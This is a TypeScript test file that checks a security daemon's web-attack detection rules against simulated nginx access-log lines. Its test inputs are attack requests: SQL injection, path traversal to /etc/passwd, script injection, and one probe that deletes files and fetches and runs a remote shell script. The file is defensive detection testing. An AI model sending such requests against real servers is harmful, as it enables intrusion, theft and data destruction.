import { afterEach, describe, it, expect, vi } from 'vitest';
import type { EventBus } from '../event-bus.js';
import type { ThreatEvent } from '../../types/events.js';
import { configureAttackDetection } from '../../core/log-parser.js';
import { DEFAULT_RULES } from '../rules/default-rules.js';
import { RuleEngine } from '../rules/engine.js';

vi.mock('../../core/state.js', () => ({ insertEvent: () => {} }));

const { LogWatcher } = await import('../watchers/log-watcher.js');

const SOURCE = { path: '/var/log/nginx/access.log', module: 'log-watcher', category: 'web' as const };

/** The event the daemon's log-watcher publishes for one access-log line. */
function daemonEvent(request: string, status = 200): ThreatEvent | undefined {
  let published: ThreatEvent | undefined;
  const bus = { publish: (e: ThreatEvent) => { published = e; } } as unknown as EventBus;
  // `process` is the watcher's per-line parser; tailing a real file adds only a
  // one-second poll around it.
  const watcher = new LogWatcher(bus, []) as unknown as { process(line: string, src: typeof SOURCE): void };
  watcher.process(
    `203.0.113.9 - - [25/Sep/2026:09:19:29 +0000] "${request}" ${status} 614 "-" "Mozilla/5.0"`,
    SOURCE,
  );
  return published;
}

function firedRules(event: ThreatEvent): string[] {
  const fired: string[] = [];
  const engine = new RuleEngine((d) => fired.push(d.rule_id));
  engine.loadRules(DEFAULT_RULES);
  engine.evaluate(event);
  return fired;
}

describe('web-attack rules on daemon log-watcher events', () => {
  afterEach(() => configureAttackDetection(undefined));

  it.each([
    ['web-sqli-attack', 'GET /search?q=1%20UNION%20SELECT%20password%20FROM%20users HTTP/1.1'],
    ['web-path-traversal', 'GET /download?file=../../../../etc/passwd HTTP/1.1'],
    ['web-xss-attack', 'GET /?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1'],
    ['exploit-probe-pattern', 'GET /shell?cd+/tmp;rm+-rf+*;wget+http://198.51.100.7/x.sh;sh+x.sh HTTP/1.1'],
  ])('%s fires on %s', (ruleId, request) => {
    const event = daemonEvent(request);
    expect(event?.severity).toMatch(/^(high|critical)$/);
    expect(firedRules(event!)).toContain(ruleId);
  });

  it.each([
    ['a 200', 200],
    ['a 404', 404],
  ])('does not fire below the CRS anomaly threshold (%s)', (_label, status) => {
    // One CRITICAL CRS rule scores 5; at a threshold of 10 it is a `low`
    // event that still carries attack_type = path_traversal.
    configureAttackDetection({ anomaly_threshold: 10 });
    const event = daemonEvent('GET /.env HTTP/1.1', status)!;
    expect(event.severity).toBe('low');
    expect(event.details?.attack_type).toBe('path_traversal');
    const webAttackRules = ['web-sqli-attack', 'web-path-traversal', 'web-xss-attack', 'exploit-probe-pattern'];
    expect(firedRules(event).filter((id) => webAttackRules.includes(id))).toEqual([]);
  });
});
